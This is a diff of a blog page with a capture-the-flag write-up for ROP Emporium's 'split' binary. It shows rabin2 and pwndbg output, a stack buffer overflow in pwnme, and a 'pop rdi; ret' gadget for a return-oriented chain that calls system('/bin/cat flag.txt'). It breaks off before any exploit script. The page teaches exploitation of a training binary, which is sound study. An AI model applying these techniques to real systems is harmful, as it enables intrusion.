@@ -11,7 +11,7 @@
 <meta property="og:url" content="https://w-disaster.github.io/split/" />
 <meta property="og:image" content="https://w-disaster.github.io/logo.png"/>
 <meta property="article:published_time" content="2022-05-13T21:13:00+02:00" />
-<meta property="article:modified_time" content="2022-05-13T21:13:00+02:00" />
+<meta property="article:modified_time" content="2022-05-14T11:42:29+02:00" />
 <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://w-disaster.github.io/logo.png"/>
 
@@ -20,7 +20,7 @@
 <meta name="application-name" content="Blog">
 <meta name="apple-mobile-web-app-title" content="Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
         <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
-        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://w-disaster.github.io/split/" /><link rel="prev" href="https://w-disaster.github.io/callme/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><script type="application/ld+json">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://w-disaster.github.io/split/" /><link rel="prev" href="https://w-disaster.github.io/callme/" /><link rel="next" href="https://w-disaster.github.io/write4/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><script type="application/ld+json">
     {
         "@context": "http://schema.org",
         "@type": "BlogPosting",
@@ -29,8 +29,8 @@
         "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "https:\/\/w-disaster.github.io\/split\/"
-        },"image": ["https:\/\/w-disaster.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "returned-oriented programming, rop","wordcount":  894 ,
-        "url": "https:\/\/w-disaster.github.io\/split\/","datePublished": "2022-05-13T21:13:00+02:00","dateModified": "2022-05-13T21:13:00+02:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+        },"image": ["https:\/\/w-disaster.github.io\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "returned-oriented programming, rop","wordcount":  960 ,
+        "url": "https:\/\/w-disaster.github.io\/split\/","datePublished": "2022-05-13T21:13:00+02:00","dateModified": "2022-05-14T11:42:29+02:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
             "@type": "Organization",
             "name": "xxxx","logo": "https:\/\/w-disaster.github.io\/images\/avatar.png"},"author": {
                 "@type": "Person",
@@ -106,7 +106,7 @@
             <div class="toc-content always-active" id="toc-content-auto"></div>
         </div><article class="page single"><h1 class="single-title animated flipInX">ROP - Split</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>w-disaster</a></span>&nbsp;<span class="post-category">included in <a href="/categories/rop/"><i class="far fa-folder fa-fw"></i>ROP</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2022-05-13">2022-05-13</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;894 words&nbsp;
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2022-05-13">2022-05-13</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;960 words&nbsp;
                 <i class="far fa-clock fa-fw"></i>&nbsp;5 minutes&nbsp;<span id="/split/" class="leancloud_visitors" data-flag-title="ROP - Split">
                         <i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;views
                     </span>&nbsp;</div>
@@ -134,8 +134,8 @@ More information in the linked website.</p>
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">curl --output split.zip https://ropemporium.com/binary/split.zip
-unzip split.zip &amp;&amp; rm split.zip
+<pre class="chroma"><code class="language-sh" data-lang="sh">$ curl --output split.zip https://ropemporium.com/binary/split.zip
+$ unzip split.zip <span class="o">&amp;&amp;</span> rm split.zip
 </code></pre></td></tr></table>
 </div>
 </div><p>Since the string is contained in the executable, let&rsquo;s start using <code>rabin2</code> to locate it:</p>
@@ -144,94 +144,170 @@ unzip split.zip &amp;&amp; rm split.zip
 <pre class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">rabin2 -z split
+<pre class="chroma"><code class="language-sh" data-lang="sh">$ rabin2 -z split
 </code></pre></td></tr></table>
 </div>
-</div><blockquote>
-<p>[Strings]</p>
-<p>nth paddr      vaddr      len size section type  string</p>
-<p>―――――――――――――――――――――――――――――――――――――――――――――――――――――――</p>
-<p>0   0x000007e8 0x004007e8 21  22   .rodata ascii split by ROP Emporium</p>
-<p>1   0x000007fe 0x004007fe 7   8    .rodata ascii x86_64\n</p>
-<p>2   0x00000806 0x00400806 8   9    .rodata ascii \nExiting</p>
-<p>3   0x00000810 0x00400810 43  44   .rodata ascii Contriving a reason to ask user for data&hellip;</p>
-<p>4   0x0000083f 0x0040083f 10  11   .rodata ascii Thank you!</p>
-<p>5   0x0000084a 0x0040084a 7   8    .rodata ascii /bin/ls</p>
-<p>0   0x00001060 0x00601060 17  18   .data   ascii /bin/cat flag.txt</p>
-</blockquote>
-<p>The string is in <code>0x00601060</code>.
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="err">[</span><span class="nf">Strings</span><span class="p">]</span>
+
+<span class="nf">nth</span> <span class="no">paddr</span>      <span class="no">vaddr</span>      <span class="no">len</span> <span class="no">size</span> <span class="no">section</span> <span class="no">type</span>  <span class="no">string</span>
+
+<span class="err">―――――――――――――――――――――――――――――――――――――――――――――――――――――――</span>
+
+<span class="err">0</span>   <span class="err">0</span><span class="nf">x000007e8</span> <span class="mi">0x004007e8</span> <span class="mi">21</span>  <span class="mi">22</span>   <span class="no">.rodata</span> <span class="no">ascii</span> <span class="no">split</span> <span class="no">by</span> <span class="no">ROP</span> <span class="no">Emporium</span>
+<span class="err">1</span>   <span class="err">0</span><span class="nf">x000007fe</span> <span class="mi">0x004007fe</span> <span class="mi">7</span>   <span class="mi">8</span>    <span class="no">.rodata</span> <span class="no">ascii</span> <span class="no">x86_64</span><span class="err">\</span><span class="no">n</span>
+<span class="err">2</span>   <span class="err">0</span><span class="nf">x00000806</span> <span class="mi">0x00400806</span> <span class="mi">8</span>   <span class="mi">9</span>    <span class="no">.rodata</span> <span class="no">ascii</span> <span class="err">\</span><span class="no">nExiting</span>
+<span class="err">3</span>   <span class="err">0</span><span class="nf">x00000810</span> <span class="mi">0x00400810</span> <span class="mi">43</span>  <span class="mi">44</span>   <span class="no">.rodata</span> <span class="no">ascii</span> <span class="no">Contriving</span> <span class="no">a</span> <span class="no">reason</span> <span class="no">to</span> <span class="no">ask</span> <span class="no">user</span> <span class="no">for</span> <span class="no">data...</span>
+<span class="err">4</span>   <span class="err">0</span><span class="nf">x0000083f</span> <span class="mi">0x0040083f</span> <span class="mi">10</span>  <span class="mi">11</span>   <span class="no">.rodata</span> <span class="no">ascii</span> <span class="no">Thank</span> <span class="no">you</span><span class="p">!</span>
+<span class="err">5</span>   <span class="err">0</span><span class="nf">x0000084a</span> <span class="mi">0x0040084a</span> <span class="mi">7</span>   <span class="mi">8</span>    <span class="no">.rodata</span> <span class="no">ascii</span> <span class="err">/</span><span class="no">bin</span><span class="err">/</span><span class="no">ls</span>
+<span class="err">0</span>   <span class="err">0</span><span class="nf">x00001060</span> <span class="mi">0x00601060</span> <span class="mi">17</span>  <span class="mi">18</span>   <span class="no">.data</span>   <span class="no">ascii</span> <span class="err">/</span><span class="no">bin</span><span class="err">/</span><span class="no">cat</span> <span class="no">flag.txt</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>The string is in <code>0x00601060</code>.
 We also know that <code>system</code> is located somewhere, so check the imported functions from shared libraries:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">rabin2 -i split
+<pre class="chroma"><code class="language-sh" data-lang="sh">$ rabin2 -i split
 </code></pre></td></tr></table>
 </div>
-</div><blockquote>
-<p>[Imports]</p>
-<p>nth vaddr      bind   type   lib name</p>
-<p>―――――――――――――――――――――――――――――――――――――</p>
-<p>1   0x00400550 GLOBAL FUNC       puts</p>
-<p>2   0x00400560 GLOBAL FUNC       system</p>
-<p>3   0x00400570 GLOBAL FUNC       printf</p>
-<p>4   0x00400580 GLOBAL FUNC       memset</p>
-<p>5   0x00400590 GLOBAL FUNC       read</p>
-<p>6   0x00000000 GLOBAL FUNC       __libc_start_main</p>
-<p>7   0x00000000 WEAK   NOTYPE     <strong>gmon_start</strong></p>
-<p>8   0x004005a0 GLOBAL FUNC       setvbuf</p>
-</blockquote>
-<p>Ok, <code>system</code> is imported, but what register should we set in order to store the parameter e.g. <code>/bin/cat flag.txt</code>?
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="err">[</span><span class="nf">Imports</span><span class="p">]</span>
+
+<span class="nf">nth</span> <span class="no">vaddr</span>      <span class="no">bind</span>   <span class="no">type</span>   <span class="no">lib</span> <span class="no">name</span>
+
+<span class="err">―――――――――――――――――――――――――――――――――――――</span>
+
+<span class="err">1</span>   <span class="err">0</span><span class="nf">x00400550</span> <span class="no">GLOBAL</span> <span class="no">FUNC</span>       <span class="no">puts</span>
+<span class="err">2</span>   <span class="err">0</span><span class="nf">x00400560</span> <span class="no">GLOBAL</span> <span class="no">FUNC</span>       <span class="no">system</span>
+<span class="err">3</span>   <span class="err">0</span><span class="nf">x00400570</span> <span class="no">GLOBAL</span> <span class="no">FUNC</span>       <span class="no">printf</span>
+<span class="err">4</span>   <span class="err">0</span><span class="nf">x00400580</span> <span class="no">GLOBAL</span> <span class="no">FUNC</span>       <span class="no">memset</span>
+<span class="err">5</span>   <span class="err">0</span><span class="nf">x00400590</span> <span class="no">GLOBAL</span> <span class="no">FUNC</span>       <span class="no">read</span>
+<span class="err">6</span>   <span class="err">0</span><span class="nf">x00000000</span> <span class="no">GLOBAL</span> <span class="no">FUNC</span>       <span class="no">__libc_start_main</span>
+<span class="err">7</span>   <span class="err">0</span><span class="nf">x00000000</span> <span class="no">WEAK</span>   <span class="no">NOTYPE</span>     <span class="no">__gmon_start__</span>
+<span class="err">8</span>   <span class="err">0</span><span class="nf">x004005a0</span> <span class="no">GLOBAL</span> <span class="no">FUNC</span>       <span class="no">setvbuf</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Ok, <code>system</code> is imported, but what register should we set in order to store the parameter e.g. <code>/bin/cat flag.txt</code>?
 Listing the function written by the programmer could be a start&hellip;:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">rabin2 -qs split | grep -ve imp -e &#39; 0 &#39;
+<pre class="chroma"><code class="language-sh" data-lang="sh">$ rabin2 -qs split <span class="p">|</span> grep -ve imp -e <span class="s1">&#39; 0 &#39;</span>
 </code></pre></td></tr></table>
 </div>
-</div><blockquote>
-<p>0x00601078 8 stdout</p>
-<p>x00601080 1 completed.7698</p>
-<p>0x004006e8 90 pwnme</p>
-<p>0x00400742 17 usefulFunction</p>
-<p>0x004007d0 2 __libc_csu_fini</p>
-<p>0x00601078 8 stdout@@GLIBC_2.2.5</p>
-<p>0x004007e0 4 _IO_stdin_used</p>
-<p>0x00601060 18 usefulString</p>
-<p>0x00400760 101 __libc_csu_init</p>
-<p>0x004005e0 2 _dl_relocate_static_pie</p>
-<p>0x004005b0 43 _start</p>
-<p>0x00400697 81 main</p>
-</blockquote>
-<p>Great! Then disassemble <code>usefulFunction</code>:</p>
-<blockquote>
-<p>pwndbg&gt; disass usefulFunction</p>
-<p>Dump of assembler code for function usefulFunction:</p>
-<p>0x0000000000400742 &lt;+0&gt;:     push   rbp</p>
-<p>0x0000000000400743 &lt;+1&gt;:     mov    rbp,rsp</p>
-<p>0x0000000000400746 &lt;+4&gt;:     mov    edi,0x40084a</p>
-<p>0x000000000040074b &lt;+9&gt;:     call   0x400560 <a href="mailto:system@plt">system@plt</a></p>
-<p>0x0000000000400750 &lt;+14&gt;:    nop</p>
-<p>0x0000000000400751 &lt;+15&gt;:    pop    rbp</p>
-<p>0x0000000000400752 &lt;+16&gt;:    ret</p>
-<p>End of assembler dump.</p>
-</blockquote>
-<p>As we can see, the edi register is used to store the string, to verify that:</p>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="err">0</span><span class="nf">x00601078</span> <span class="mi">8</span> <span class="no">stdout</span>
+<span class="err">0</span><span class="nf">x00601080</span> <span class="mi">1</span> <span class="no">completed.7698</span>
+<span class="err">0</span><span class="nf">x004006e8</span> <span class="mi">90</span> <span class="no">pwnme</span>
+<span class="err">0</span><span class="nf">x00400742</span> <span class="mi">17</span> <span class="no">usefulFunction</span>
+<span class="err">0</span><span class="nf">x004007d0</span> <span class="mi">2</span> <span class="no">__libc_csu_fini</span>
+<span class="err">0</span><span class="nf">x00601078</span> <span class="mi">8</span> <span class="no">stdout@@GLIBC_2.2.5</span>
+<span class="err">0</span><span class="nf">x004007e0</span> <span class="mi">4</span> <span class="no">_IO_stdin_used</span>
+<span class="err">0</span><span class="nf">x00601060</span> <span class="mi">18</span> <span class="no">usefulString</span>
+<span class="err">0</span><span class="nf">x00400760</span> <span class="mi">101</span> <span class="no">__libc_csu_init</span>
+<span class="err">0</span><span class="nf">x004005e0</span> <span class="mi">2</span> <span class="no">_dl_relocate_static_pie</span>
+<span class="err">0</span><span class="nf">x004005b0</span> <span class="mi">43</span> <span class="no">_start</span>
+<span class="err">0</span><span class="nf">x00400697</span> <span class="mi">81</span> <span class="no">main</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Great! Then disassemble <code>usefulFunction</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">disass</span> <span class="no">usefulFunction</span>
+<span class="nf">Dump</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">code</span> <span class="no">for</span> <span class="no">function</span> <span class="no">usefulFunction</span><span class="p">:</span>
+  <span class="err">0</span><span class="nf">x0000000000400742</span> <span class="err">&lt;+</span><span class="mi">0</span><span class="err">&gt;</span><span class="p">:</span>     <span class="no">push</span>   <span class="no">rbp</span>
+  <span class="err">0</span><span class="nf">x0000000000400743</span> <span class="err">&lt;+</span><span class="mi">1</span><span class="err">&gt;</span><span class="p">:</span>     <span class="no">mov</span>    <span class="no">rbp</span><span class="p">,</span><span class="no">rsp</span>
+  <span class="err">0</span><span class="nf">x0000000000400746</span> <span class="err">&lt;+</span><span class="mi">4</span><span class="err">&gt;</span><span class="p">:</span>     <span class="no">mov</span>    <span class="no">edi</span><span class="p">,</span><span class="mi">0x40084a</span>
+  <span class="err">0</span><span class="nf">x000000000040074b</span> <span class="err">&lt;+</span><span class="mi">9</span><span class="err">&gt;</span><span class="p">:</span>     <span class="no">call</span>   <span class="mh">0x400560</span> <span class="p">&lt;</span><span class="no">system@plt</span><span class="p">&gt;</span>
+  <span class="err">0</span><span class="nf">x0000000000400750</span> <span class="err">&lt;+</span><span class="mi">14</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">nop</span>
+  <span class="err">0</span><span class="nf">x0000000000400751</span> <span class="err">&lt;+</span><span class="mi">15</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">pop</span>    <span class="no">rbp</span>
+  <span class="err">0</span><span class="nf">x0000000000400752</span> <span class="err">&lt;+</span><span class="mi">16</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">ret</span>    
+<span class="no">End</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">dump.</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>As we can see, the edi register is used to store the string, to verify that:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">pwndbg&gt; x/s 0x40084a
+<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">x</span><span class="err">/</span><span class="no">s</span> <span class="mi">0x40084a</span>
 </code></pre></td></tr></table>
 </div>
-</div><blockquote>
-<p>0x40084a:       &ldquo;/bin/ls&rdquo;</p>
-</blockquote>
-<p>Enter to pwndbg (<code>gdb-pwndbg split</code>) and disassemble <code>pwnme</code>:</p>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="err">0</span><span class="nl">x40084a:</span>       <span class="err">&#34;/</span><span class="nf">bin</span><span class="err">/</span><span class="no">ls</span><span class="err">&#34;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Enter to pwndbg (<code>gdb-pwndbg split</code>) and disassemble <code>pwnme</code>:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre class="chroma"><code><span class="lnt"> 1
@@ -262,32 +338,32 @@ Listing the function written by the programmer could be a start&hellip;:</p>
 </span><span class="lnt">26
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">pwndbg&gt; disass pwnme
-Dump of assembler code for function pwnme:
-   0x00000000004006e8 &lt;+0&gt;:     push   rbp
-   0x00000000004006e9 &lt;+1&gt;:     mov    rbp,rsp
-   0x00000000004006ec &lt;+4&gt;:     sub    rsp,0x20
-   0x00000000004006f0 &lt;+8&gt;:     lea    rax,[rbp-0x20]
-   0x00000000004006f4 &lt;+12&gt;:    mov    edx,0x20
-   0x00000000004006f9 &lt;+17&gt;:    mov    esi,0x0
-   0x00000000004006fe &lt;+22&gt;:    mov    rdi,rax
-   0x0000000000400701 &lt;+25&gt;:    call   0x400580 &lt;memset@plt&gt;
-   0x0000000000400706 &lt;+30&gt;:    mov    edi,0x400810
-   0x000000000040070b &lt;+35&gt;:    call   0x400550 &lt;puts@plt&gt;
-   0x0000000000400710 &lt;+40&gt;:    mov    edi,0x40083c
-   0x0000000000400715 &lt;+45&gt;:    mov    eax,0x0
-   0x000000000040071a &lt;+50&gt;:    call   0x400570 &lt;printf@plt&gt;
-   0x000000000040071f &lt;+55&gt;:    lea    rax,[rbp-0x20]
-   0x0000000000400723 &lt;+59&gt;:    mov    edx,0x60
-   0x0000000000400728 &lt;+64&gt;:    mov    rsi,rax
-   0x000000000040072b &lt;+67&gt;:    mov    edi,0x0
-   0x0000000000400730 &lt;+72&gt;:    call   0x400590 &lt;read@plt&gt;
-   0x0000000000400735 &lt;+77&gt;:    mov    edi,0x40083f
-   0x000000000040073a &lt;+82&gt;:    call   0x400550 &lt;puts@plt&gt;
-   0x000000000040073f &lt;+87&gt;:    nop
-   0x0000000000400740 &lt;+88&gt;:    leave  
-   0x0000000000400741 &lt;+89&gt;:    ret    
-End of assembler dump.
+<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">disass</span> <span class="no">pwnme</span>
+<span class="nf">Dump</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">code</span> <span class="no">for</span> <span class="no">function</span> <span class="no">pwnme</span><span class="p">:</span>
+   <span class="err">0</span><span class="nf">x00000000004006e8</span> <span class="err">&lt;+</span><span class="mi">0</span><span class="err">&gt;</span><span class="p">:</span>     <span class="no">push</span>   <span class="no">rbp</span>
+   <span class="err">0</span><span class="nf">x00000000004006e9</span> <span class="err">&lt;+</span><span class="mi">1</span><span class="err">&gt;</span><span class="p">:</span>     <span class="no">mov</span>    <span class="no">rbp</span><span class="p">,</span><span class="no">rsp</span>
+   <span class="err">0</span><span class="nf">x00000000004006ec</span> <span class="err">&lt;+</span><span class="mi">4</span><span class="err">&gt;</span><span class="p">:</span>     <span class="no">sub</span>    <span class="no">rsp</span><span class="p">,</span><span class="mi">0x20</span>
+   <span class="err">0</span><span class="nf">x00000000004006f0</span> <span class="err">&lt;+</span><span class="mi">8</span><span class="err">&gt;</span><span class="p">:</span>     <span class="no">lea</span>    <span class="no">rax</span><span class="p">,[</span><span class="no">rbp-0x20</span><span class="p">]</span>
+   <span class="err">0</span><span class="nf">x00000000004006f4</span> <span class="err">&lt;+</span><span class="mi">12</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">edx</span><span class="p">,</span><span class="mi">0x20</span>
+   <span class="err">0</span><span class="nf">x00000000004006f9</span> <span class="err">&lt;+</span><span class="mi">17</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">esi</span><span class="p">,</span><span class="mi">0x0</span>
+   <span class="err">0</span><span class="nf">x00000000004006fe</span> <span class="err">&lt;+</span><span class="mi">22</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span><span class="no">rax</span>
+   <span class="err">0</span><span class="nf">x0000000000400701</span> <span class="err">&lt;+</span><span class="mi">25</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x400580</span> <span class="p">&lt;</span><span class="no">memset@plt</span><span class="p">&gt;</span>
+   <span class="err">0</span><span class="nf">x0000000000400706</span> <span class="err">&lt;+</span><span class="mi">30</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">edi</span><span class="p">,</span><span class="mi">0x400810</span>
+   <span class="err">0</span><span class="nf">x000000000040070b</span> <span class="err">&lt;+</span><span class="mi">35</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x400550</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
+   <span class="err">0</span><span class="nf">x0000000000400710</span> <span class="err">&lt;+</span><span class="mi">40</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">edi</span><span class="p">,</span><span class="mi">0x40083c</span>
+   <span class="err">0</span><span class="nf">x0000000000400715</span> <span class="err">&lt;+</span><span class="mi">45</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">eax</span><span class="p">,</span><span class="mi">0x0</span>
+   <span class="err">0</span><span class="nf">x000000000040071a</span> <span class="err">&lt;+</span><span class="mi">50</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x400570</span> <span class="p">&lt;</span><span class="no">printf@plt</span><span class="p">&gt;</span>
+   <span class="err">0</span><span class="nf">x000000000040071f</span> <span class="err">&lt;+</span><span class="mi">55</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rax</span><span class="p">,[</span><span class="no">rbp-0x20</span><span class="p">]</span>
+   <span class="err">0</span><span class="nf">x0000000000400723</span> <span class="err">&lt;+</span><span class="mi">59</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">edx</span><span class="p">,</span><span class="mi">0x60</span>
+   <span class="err">0</span><span class="nf">x0000000000400728</span> <span class="err">&lt;+</span><span class="mi">64</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rsi</span><span class="p">,</span><span class="no">rax</span>
+   <span class="err">0</span><span class="nf">x000000000040072b</span> <span class="err">&lt;+</span><span class="mi">67</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">edi</span><span class="p">,</span><span class="mi">0x0</span>
+   <span class="err">0</span><span class="nf">x0000000000400730</span> <span class="err">&lt;+</span><span class="mi">72</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x400590</span> <span class="p">&lt;</span><span class="no">read@plt</span><span class="p">&gt;</span>
+   <span class="err">0</span><span class="nf">x0000000000400735</span> <span class="err">&lt;+</span><span class="mi">77</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">edi</span><span class="p">,</span><span class="mi">0x40083f</span>
+   <span class="err">0</span><span class="nf">x000000000040073a</span> <span class="err">&lt;+</span><span class="mi">82</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x400550</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
+   <span class="err">0</span><span class="nf">x000000000040073f</span> <span class="err">&lt;+</span><span class="mi">87</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">nop</span>
+   <span class="err">0</span><span class="nf">x0000000000400740</span> <span class="err">&lt;+</span><span class="mi">88</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">leave</span>  
+   <span class="mi">0x0000000000400741</span> <span class="err">&lt;+</span><span class="mi">89</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">ret</span>    
+<span class="no">End</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">dump.</span>
 </code></pre></td></tr></table>
 </div>
 </div><p>As we can see there&rsquo;s a <code>rax,[rbp-0x20]</code> instruction before the read operation. Here <code>0x20</code> is subtracted from <code>rbp</code> since they&rsquo;re the bytes allocated to store the input string (32 bytes): if more chars are inserted it&rsquo;s possible to overwrite the return address of this function, so this is the point where the flow of execution will be changed by us.</p>
@@ -297,13 +373,18 @@ End of assembler dump.
 <pre class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-fallback" data-lang="fallback">ropper -f split
+<pre class="chroma"><code class="language-sh" data-lang="sh">$ ropper -f split
 </code></pre></td></tr></table>
 </div>
-</div><blockquote>
-<p>0x00000000004007c3: pop rdi; ret;</p>
-</blockquote>
-<p>Done.
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="err">0</span><span class="nl">x00000000004007c3:</span> <span class="nf">pop</span> <span class="no">rdi</span><span class="c">; ret; 
+</span></code></pre></td></tr></table>
+</div>
+</div><p>Done.
 Now we can build the rop chain. At the ret instruction at the end of <code>pwnme</code> the stack should be like:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -421,25 +502,33 @@ Now we can build the rop chain. At the ret instruction at the end of <code>pwnme
 </div><div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre class="chroma"><code><span class="lnt">1
